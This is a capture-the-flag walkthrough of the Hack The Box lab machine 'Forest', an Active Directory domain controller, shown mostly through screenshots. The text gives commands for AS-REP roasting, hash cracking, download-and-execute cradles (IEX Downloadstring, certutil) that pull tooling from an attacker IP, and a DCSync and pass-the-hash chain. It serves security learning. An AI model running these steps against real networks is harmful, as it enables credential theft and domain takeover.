---
title: "Forest HTB"
date: 2024-08-07 20:17:41 +0800
categories: [Forest, Medium]
tags: [Forest, Easy-Level, HTB Walkthrough]
---



 "
Series Intro:
Hello Hackers, Today we are gonna attack another HTB retired machine in our Active Directory series for a better practical learning experience for me. As soon as I’m done with this series, I’m gonna make tutorials on each stage of compromising active directory domain controller with detailed mind maps. feel free to follow up If anything interests you.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*nSw-_MeL8HrXdGg8T7mENw.gif)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*XVl1noITNhAp1uAtm-Xibw.png)
Analyzing Nmap result:
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*pQpF4bPE3314feHvINrHtA.png)
We got 135 rpc, 389 ldap, 445 smb & 5985 winrm service open ports.
Further, after this, Let’s focus on the enumeration of these ports.
You can try rpcclient, for Kerberos(Impacket libraries like Getuserspns.py, GetADUsers.py, GetNPUsers.py), smbclient/smbmap & evil-winrm for winrm are common enumeration tools.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*_E56BxjRpDfK0QY85gSa4w.png)
First I started Enumeration with rpcclient & while smbclient those don’t seem to work with an anonymous login. we can also go for an LDAP search or do some LDAP scans for more information. I see that the domain name “htb.local” from
namingContexts: DC:htb, DC=local.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*dXRZJfXkJbQkwH4ZerHHPw.png)
But I just went with Kerberos, Normally for attacking Kerberos we need usernames since, Anonymous Login is allowed & it is successful.
we have something that can be logged in that’s all we need for now.
GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*38m_4ozFaZe4VKGerMKpyA.png)
Yeyy(❁´◡`❁)!! That did give us TGT for some account .
Background knowledge on how this was working ASREP-Roasting
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*2iAr73r4ngg87PpW3I0ylA.png)
we can see the username and domain name attached to it. I googled cracking krb5asrep hashes. or you search it with hashcat,
hashcat -h | grep -i “AS-REP” for offline approach.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*Ecnt7aNYh1m_iAUJvnQl3Q.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*rY2CsH-2OnPmKfz3SX1S0w.png)
And done, we just got our first credentials😁. Let’s try this out on the services we already know.
we can see that, we still have only read-access on the shares which wasn’t preventing us from getting a shell with these shares.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*e4tcQmmlIqgSvRo9KP2ajg.png)
Saving up the hassle for you, I tried smbclient but it got me nowhere.
Since We also got the Winrm remote management service for this machine. which would normally used by system administrators to access the machine using remote management. A quick tool that can come to my mind is gonna be, Evil-winrm.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*r5EY3DGSgVtqMX77r4c6Dw.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*70ULGxFkx7Qrl0YQjB_3NA.png)
Tada!!! We got the User flag!!!!!!!!!!!!!!!!!!
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*FvXmzjMkTPwwCPSXM6lwKA.gif)
Done?? Not yet!!
After trying tried run Privilege Escalation methods like winpeasx64 and Windows local exploit suggesters. Since we are getting information out of LDAP. Seems like it is less authenticated.
We can fire up Bloodhound on the victim machine and Gather all information on the domain controller in one place. It might get intimidating but we are just gathering enumerating domain information through BloodHound here.
We will be needing a smbserver connection between the alfresco machine and Kali for easy file transfer. Most of the time we will be getting smb shell. So, this is better in that case.     
For that, Step 1: we need to start a smbserver on our end to get access from our victim as a share. for better file transfer.
sudo impacket-smbserver tmp $(pwd) -smb2support -user smbserver -password anypassword
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*5HTVVemls77y378aB9bYcw.png)
Step 2: Then to access this share of ours on the victim machine do the following commands.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*pDZtxvFlQGEupNv5VbtJRg.png)
Step 3: Finally, Creating a drive with this share while Assigning it as the root directory can give us root access.
Complete these three steps:
$pass = convertto-securestring ‘anypassword’ -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential (‘servername’, $pass)
New-PSDrive -Name anyname -PSProvider FileSystem -Credential $cred -Root \10.10.x.x     mp
SMB Share Connection is Established.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*jP_6xTw0av0aSi7OCZnZOA.png)
SharpHound:
we can do it with the help of SharpHound. For those who haven’t downloaded it yet!! Here’s a Github Link.
And started a Python HTTP web server in that directory.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*1BmQttIQ5ujYa7WCHA38Lg.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*1ySPgG-iTBzLJ2sBWAlKmA.png)
IEX(Net-Object Net.Webclient).Downloadstring(“http://10.10.16.2/SharpHound.ps1")
For some reason, this shell doesn’t return few errors.
If this is file transfer wasn’t working well. Use certutil.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*e43OVpgRPv6ygKPRFbowIQ.png)
certutil.exe -urlcache -f http://10.10.16.2/SharpHound.ps1 SharpHound.ps1
And verify it with,
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*cbDP4CNPFgB21IyFxBDAgw.png)
Still this gave me nothing, I guess the SharpHound.ps1 isn’t working.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*NOsN0JR4c7oEDGRGaFc20w.png)
Tried, SharpHound.exe from the Bloodhound Modules.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*GbPiTDFR0Gs6pTD6gnoCYA.png)
Used the same, certutil for file transfer.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*gXjAXVCnSRVDGcbfTZfSJA.png)
And it is working now. Might be that Powershell cmds aren’t working on this shell even if it was a Powershell 😂.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*9RCQNEAOKXYgq0Apt5VYTA.png)
Finally, we got the bloodhound file we needed for discovering ways to privilege escalation on this machine.
In Evil-WinRM, you can do the download
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*3wBh5m7ljf1pKN_ELcJ9VQ.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*w1FmeNp6DzTUDIrcBe7hTw.png)
Or since the SMBserver is already running. you can simply change to that directory and do the command xcopy.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*vIgTB5HI67kF70xmsefKjA.png)
Analyzing Bloodhound results:
Let me walk through this If you’re not familiar with Bloodhound It can be intimidating. Even I’m not just staying tuned (Bloodhound is simply better Mind Map from Domain Enumeration Scan). First and foremost of exfiltering results, Shortest paths to Unconstrained Delegation Systems.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*PRzkpGVcmPvI5CA8KWRGUw.png)
Then, we can select our user svc-alfresco as owned with Mark User as Owned.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*nqp1W4QzXhL8NbQg4oK81Q.png)
Then we can select the Shortest Path from Owned Principals. To see the Groups you are active and the permissions. With Bloodhound you can also get to see attack suggestions for privilege Escalation.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*LZuFwS23lfDfr4VsWRSnmw.png)
After analyzing the Bloodhound results we can see the instructions that were shown for abusing the Windows machine.
Note: The Exchange Windows Permissions(EWP) Do have WriteDACL Access which basically allows all members of it to modify the privileges. With this in hand, we will be using ntlmrelay for escalating svc-alfresco as soon as the authentication is relayed to LDAP after adding it to this EWP group. This is called a DCSync Attack simply gaining privileges over abusing access control lists.
BloodHound Tip:
If you ever feel like getting stuck and don’t really understand how to escalate further. Always remember you’re end goal is gonna administrative privileges. Between the mapping nodes. You can simply right-click & there will be help menu beneath unveiling standard ways and few references. Always be should sure to head there.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*ay5A2Onbfx3d8xgaQ2GeUQ.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*olE1-t1Zp-PWaF5_bdlkjA.png)
Few More Possible Outcomes are available on this Privilege Escalation Cheatsheet, Feel free to check out for other attacks.
Back to the Attack:
We need the PowerView for this attack. Since we want to add our user to this specific Group for Escalating. For performing a DCsync attack.
This Attack can help us in relaying the hashes using ntlmrelayx
Add-ADGroupMember -Identity “Exchange Windows Permissions” -members svc-alfresco
This below command lets you add user into the Exchange Windows Permissions Group.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*DM6KQCKSstbwmn-HRmabsg.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*TGnGrQCQIFbyx9Mm6RC4dg.png)
Also If you want to add a new domain to this Group, You can directly create a new AD User & Add this user with the same Add-ADGroupMember command to add this user into the Exchange server.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*YOaN2fJrnR2H90f01kQSyQ.png)
Or you can still progress with our existing account “svc-alfresco”.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*Y3qF2FgBLj0imJoSl7PJZg.png)
After this, The Server will be waiting for authentication. We can do this by going to http://127.0.0.1 our localhost address. After you have entered the username and password.
And done privileges are already escalated you can confirm this with secretsdump.py from impacket. You can see that, now we can dump administrator hashes.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*sKlmM5KZRWcZiAxBQX3nJw.png)
And That’s it with these hashes in hand. We can simply relay these hashes using the Pass-the-hash technique as Administrator with the psexec.py from Impacket as well.
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*nCwrQSz19o1oLKZTeaT9aA.png)
And the Juicy ROOOT FLAG😋😋!!!!
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*N5eqM-zWpjcm0mupqYzRUA.png)
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*TuCoz17Sh748rvfnIWuP6g.png)
Not so easy!! Right?
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*QP9Fpa5wqFXPEpLo8qgQDA.gif)
Forest was said to be an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which are used to enumerate domain objects.
The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.
why we are doing, what we are doing?
![Untitled](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*VAKgNxddT-bWgWaHyT6Vbg.png)"
